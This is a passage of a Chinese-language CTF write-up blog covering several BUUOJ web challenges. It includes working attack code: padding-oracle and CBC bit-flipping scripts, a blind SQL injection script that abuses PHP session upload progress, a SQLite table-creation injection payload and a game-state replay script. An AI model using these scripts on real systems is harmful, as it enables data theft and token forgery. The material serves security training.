class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'\x97.\xda\xb8\xa5P\t\x95\xae\x9b\xf5\xbf\xe2\x8b.&lt;'</span></span><br><span class="line">CYPHERTEXT = base64.b64decode(<span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>)</span><br><span class="line"><span class="comment"># initialization vector</span></span><br><span class="line">IV = <span class="string">"6666666666666666"</span></span><br><span class="line"><span class="comment"># PKCS7 16个字节为1组</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line"><span class="comment"># intermediaryValue ^ IV = plainText</span></span><br><span class="line">inermediaryValue = <span class="string">""</span></span><br><span class="line">plainText = <span class="string">""</span></span><br><span class="line"><span class="comment"># 爆破时不断需要更改的iv</span></span><br><span class="line">iv = <span class="string">""</span></span><br><span class="line">URL = <span class="string">"http://e2806171-574c-4b88-a59c-74cfbb5d13cb.node3.buuoj.cn/index.php?method=decrypt&amp;source=1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    用于输出两个字符串对位异或的结果</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">    padding = chr(step) * (step - <span class="number">1</span>)</span><br><span class="line">    print(step,end=<span class="string">","</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        iv由三部分组成：</span></span><br><span class="line"><span class="string">            待爆破位置 chr(0)*(N-step)</span></span><br><span class="line"><span class="string">            正在爆破位置 chr(i)</span></span><br><span class="line"><span class="string">            使 iv[N-step+1:] ^ inermediaryValue = padding 的 xor(padding,inermediaryValue)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        iv = chr(<span class="number">0</span>)*(N-step)+chr(i)+xor(padding,inermediaryValue)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"data"</span>: <span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>,</span><br><span class="line">            <span class="string">"iv"</span>: iv</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(URL,data = data)</span><br><span class="line">        <span class="keyword">if</span> r.text !=<span class="string">"False"</span>:</span><br><span class="line">            inermediaryValue = xor(chr(i),chr(step)) + inermediaryValue</span><br><span class="line">            print(inermediaryValue)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">plainText = xor(inermediaryValue,IV)</span><br><span class="line">print(plainText)</span><br></pre></td></tr></table></figure><p>跑出FlagIsHere.php,访问，还是一层</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(b1, b2)</span>:</span> <span class="comment"># use xor for bytes</span></span><br><span class="line">    parts = []</span><br><span class="line">    <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> zip(b1, b2):</span><br><span class="line">        parts.append(bytes([b1 ^ b2]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(parts)</span><br><span class="line">iv = base64.b64decode(<span class="string">"979H6BtnbZagkjEBT316rA=="</span>)</span><br><span class="line">text = <span class="string">b"piapiapiapia\x04\x04\x04\x04"</span></span><br><span class="line">result = <span class="string">b"weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"</span></span><br><span class="line">middle = bxor(iv,text)</span><br><span class="line">iv = bxor(middle,result)</span><br><span class="line">print(base64.b64encode(iv))</span><br></pre></td></tr></table></figure><p>跑出的iv的值post过去，会给提示，buu上直接下载附件，是java反编译，用Luyten-master反编译，GitHub：<a href="https://github.com/deathmarine/Luyten/releases开箱即用" target="_blank" rel="noopener">https://github.com/deathmarine/Luyten/releases开箱即用</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] array)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"\u4f17\u6240\u5468\u77e5\uff0c\u4f60\u662f\u4e00\u540dWEB\u9009\u624b\uff0c\u638c\u63e1javaweb\u4e5f\u662f\u4e00\u9879\u5fc5\u5907\u6280\u80fd\uff0c\u90a3\u4e48\u9006\u5411\u4e2ajava\u5e94\u8be5\u4e0d\u8fc7\u5206\u5427\uff1f"</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] array2 = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接把对应的ascii值转换成字符拼接就是了</p><img src="/2020/07/11/vacation2/4.png" class=""><h3 id="b01lers2020-Space-Noodles"><a href="#b01lers2020-Space-Noodles" class="headerlink" title="[b01lers2020]Space Noodles"></a>[b01lers2020]Space Noodles</h3><p>这道题挺没意思的，就是考http不同的传输方法，直接附上一篇wp：<a href="https://ctftime.org/writeup/19141" target="_blank" rel="noopener">https://ctftime.org/writeup/19141</a></p><hr><p>中间停了好多天没做题了，去准备一个上课的东西去了，那边要求，改来改去的，搞了好多天，总算准备完了，后天轮到上课，这两天得继续自己的事了</p><h3 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h3><p>这道题不知道咋回事，打开啥都没有，玩不了这个21点，只能是借鉴一下wp写一下了</p><p>每个请求都有SecretState参数，保存游戏当前状态，每次请求之后会生成新的SecretState</p><p>游戏赢了更新SecretState，否则不更新</p><p>这里要注意的是下注之后开牌要用新的SecretState，下注时分数已经扣除了</p><p>利用21点规则，两张牌已经是21点，直接就赢了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">start &#x3D; &quot;http:&#x2F;&#x2F;0c168e61-9d77-44d8-8a66-56e77d85d52a.node3.buuoj.cn&#x2F;api&quot;</span><br><span class="line">deal &#x3D; start + &quot;&#x2F;deal&quot;</span><br><span class="line">proxy &#x3D; &#123;&quot;https&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:1087&#x2F;&quot;&#125;#设置本地为代理</span><br><span class="line"># 开局</span><br><span class="line">state &#x3D; requests.post(start, proxies&#x3D;proxy).json()[&quot;SecretState&quot;]</span><br><span class="line">while True:</span><br><span class="line">    # 下注</span><br><span class="line">    try:</span><br><span class="line">        resp &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;, proxies&#x3D;proxy).json()</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    if resp[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;:</span><br><span class="line">        state &#x3D; resp[&#39;SecretState&#39;]</span><br><span class="line">    # print(resp[&#39;Balance&#39;])</span><br><span class="line">    if resp[&#39;Balance&#39;] &gt; 100000:</span><br><span class="line">        print(resp)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><img src="/2020/07/11/vacation2/5.png" class=""><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>source.zip下载源码，看到重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>($_SESSION) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Direct access on this script is not allowed!"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="'</span> . $_GET[<span class="string">'username'</span>] . <span class="string">'" and password="'</span> . md5($_GET[<span class="string">'password'</span>]) . <span class="string">'";'</span>;</span><br><span class="line">$result = $con-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $user;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> auth($row[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" /&gt;'</span>)) <span class="keyword">OR</span> ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'Try again!'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在login.php中对session进行了判断，如果没有就die</p><p>php.ini中有一些关于session的配置：<br>若session.auto_start=on，就会自动session初始化，但是默认是off的<br>还有一个：PHP_SESSION_UPLOAD_PROGRESS是默认开启的，看一下官方文档</p><img src="/2020/07/11/vacation2/6.png" class=""><p>这个是用来检测文件上传进度的，如果同时上传一个文件，并且POST一个同名变量PHP_SESSION_UPLOAD_PROGRESS，那么就会在_SESSION中获取上传进度</p><p>构造post脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://cec2b7d6-c5ce-4db1-917c-2231ccc67bce.node3.buuoj.cn/templates/login.php'</span></span><br><span class="line">files=&#123;<span class="string">"file"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">130</span>):</span><br><span class="line">        params=&#123;<span class="string">"username"</span>:<span class="string">'test" or (ascii(substr((select group_concat(secret) from flag_tbl),'</span>+str(b)+<span class="string">',1))='</span>+str(i)+<span class="string">')#'</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"test"</span>&#125;</span><br><span class="line">        a=requests.post(url=url,files=files,data=data,cookies=cookies,params=params).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'meta'</span> <span class="keyword">in</span> a:</span><br><span class="line">            text += chr(i)</span><br><span class="line">            print(text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这个脚本速度很慢，可以改成二分法</p><h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p>开题，是这样的页面</p><img src="/2020/07/11/vacation2/7.png" class=""><p>可以创建一个表并且往里面添加数据，是sql注入没跑了，但是不知道是哪个数据库，猜测不是mysql</p><p>dirsearch扫一下目录</p><img src="/2020/07/11/vacation2/8.png" class=""><p>这两个页面都没有回显什么有用的信息，不知道该怎么拿源码，该试的都试过了，直接Gitlab扒下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'util.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$method = (string) ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] ?? <span class="string">'GET'</span>);</span><br><span class="line">$page = (string) ($_GET[<span class="string">'page'</span>] ?? <span class="string">'index'</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array($page, [<span class="string">'index'</span>, <span class="string">'create'</span>, <span class="string">'insert'</span>, <span class="string">'delete'</span>])) &#123;</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$message = $_SESSION[<span class="string">'flash'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'flash'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array($page, [<span class="string">'insert'</span>, <span class="string">'delete'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  flash(<span class="string">"Please create database first."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  $pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:db/'</span> . $_SESSION[<span class="string">'database'</span>]);</span><br><span class="line">  $stmt = $pdo-&gt;query(<span class="string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '"</span> . FLAG_TABLE . <span class="string">"' LIMIT 1;"</span>);</span><br><span class="line">  $table_name = $stmt-&gt;fetch(PDO::FETCH_ASSOC)[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">  $stmt = $pdo-&gt;query(<span class="string">"PRAGMA table_info(`&#123;$table_name&#125;`);"</span>);</span><br><span class="line">  $column_names = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($page === <span class="string">'insert'</span> &amp;&amp; $method === <span class="string">'POST'</span>) &#123;</span><br><span class="line">  $values = $_POST[<span class="string">'values'</span>];</span><br><span class="line">  $stmt = $pdo-&gt;prepare(<span class="string">"INSERT INTO `&#123;$table_name&#125;` VALUES (?"</span> . str_repeat(<span class="string">',?'</span>, count($column_names) - <span class="number">1</span>) . <span class="string">")"</span>);</span><br><span class="line">  $stmt-&gt;execute($values);</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($page === <span class="string">'create'</span> &amp;&amp; $method === <span class="string">'POST'</span> &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'table_name'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'columns'</span>])) &#123;</span><br><span class="line">    flash(<span class="string">'Parameters missing.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $table_name = (string) $_POST[<span class="string">'table_name'</span>];</span><br><span class="line">  $columns = $_POST[<span class="string">'columns'</span>];</span><br><span class="line">  $filename = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">'.db'</span>;</span><br><span class="line">  $pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:db/'</span> . $filename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid($table_name)) &#123;</span><br><span class="line">    flash(<span class="string">'Table name contains dangerous characters.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen($table_name) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen($table_name)) &#123;</span><br><span class="line">    flash(<span class="string">'Table name must be 4-32 characters.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count($columns) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count($columns)) &#123;</span><br><span class="line">    flash(<span class="string">'Number of columns is up to 10.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $sql = <span class="string">"CREATE TABLE &#123;$table_name&#125; ("</span>;</span><br><span class="line">  $sql .= <span class="string">"dummy1 TEXT, dummy2 TEXT"</span>;</span><br><span class="line">  <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($columns); $i++) &#123;</span><br><span class="line">    $column = (string) ($columns[$i][<span class="string">'name'</span>] ?? <span class="string">''</span>);</span><br><span class="line">    $type = (string) ($columns[$i][<span class="string">'type'</span>] ?? <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_valid($column) || !is_valid($type)) &#123;</span><br><span class="line">      flash(<span class="string">'Column name or type contains dangerous characters.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen($column) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($column) || strlen($type) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($type)) &#123;</span><br><span class="line">      flash(<span class="string">'Column name and type must be 1-32 characters.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sql .= <span class="string">', '</span>;</span><br><span class="line">    $sql .= <span class="string">"`$column` $type"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $sql .= <span class="string">');'</span>;</span><br><span class="line"></span><br><span class="line">  $pdo-&gt;query(<span class="string">'CREATE TABLE `'</span> . FLAG_TABLE . <span class="string">'` (`'</span> . FLAG_COLUMN . <span class="string">'` TEXT);'</span>);</span><br><span class="line">  $pdo-&gt;query(<span class="string">'INSERT INTO `'</span> . FLAG_TABLE . <span class="string">'` VALUES ("'</span> . FLAG . <span class="string">'");'</span>);</span><br><span class="line">  $pdo-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">  $_SESSION[<span class="string">'database'</span>] = $filename;</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>去掉了部分没有用的代码，下面就来看看源码</p><p>注意到sql拼接创建表的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#123;$table_name&#125; (dummy1 TEXT, dummy2 TEXT</span><br></pre></td></tr></table></figure><p>google一下发现是SQLite</p><p>有关于SQLite三个知识点</p><p>第一个：我们在使用sqlite语法的时候列名是可以加方括号的，是为了和mysql语法兼容。例如：select [sql] from sqlite_master;</p><p>第二个：我们在使用sqlite_master时使用错误的语法，sqlite将会忽略后面列的名称，无论列的名称是否真实的存在，除非在列之间放置</p><p>第三个：我们在使用sqlite语法时，用该语句create table ..as select ..创建表时可以不用带括号</p><p>每个sqlite都有一个自动创建的库sqlite_master，里面保存了所有表名以及创建表时的create语句，可以从中获取flag的表名和字段名</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;[aaa]as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table [aaa] as select sql from sqlite_master</span><br><span class="line">查找sqlite_master中sql列的值放入aaa表中</span><br></pre></td></tr></table></figure><img src="/2020/07/11/vacation2/9.png" class=""><p>查到了表名和列名，继续查</p><img src="/2020/07/11/vacation2/10.png" class=""><h2 id="CISCN2019-东北赛区-Day2-Web3-Point-System"><a href="#CISCN2019-东北赛区-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 东北赛区 Day2 Web3]Point System"></a>[CISCN2019 东北赛区 Day2 Web3]Point System</h2><p>开题，扫目录</p><img src="/2020/07/11/vacation2/11.png" class=""><p>访问得到的路径，是一个前端API界面</p><img src="/2020/07/11/vacation2/12.png" class=""><p>这里的注册不能直接用，用postman</p><img src="/2020/07/11/vacation2/13.png" class=""><p>用这个账号登录，发现权限不够，看了一下数据传输过程</p><img src="/2020/07/11/vacation2/14.png" class=""><p>token好像是base64，解密之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98&#x2F;+1ZXvkP16YkJhBIHoJvCOJAsEgoP7x8E2FffKsH8ZXENQPt6&#x2F;XN7MTw3QO+6mlQ23ZOIdF817b59sxTzBNDzELdMA&#x3D;&#x3D;&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;2xCDATnZ9AxdNyuipTgPLMTtIRwX6eDj&quot;,&quot;expire_in&quot;:1596028630&#125;</span><br></pre></td></tr></table></figure><p>signed_key继续解密，发现乱码，下面是看的赵师傅的blog做的</p><p>.前为明文后为乱码，推测前为 IV 后为加密后的密文，推测其为 AES CBC 加密</p><p>借用赵师傅的加密，伪造脚本，这里因为个人原因没跑成功，就只记下思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padoracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoed = base64.b64decode(signed_key)</span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, int(len(signed_key) / <span class="number">16</span>) - <span class="number">3</span>):</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = <span class="string">""</span></span><br><span class="line">        cipher = signed_key_decoed[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                token = signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">                padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">                c = (chr(<span class="number">0</span>) * (<span class="number">16</span> - i)) + 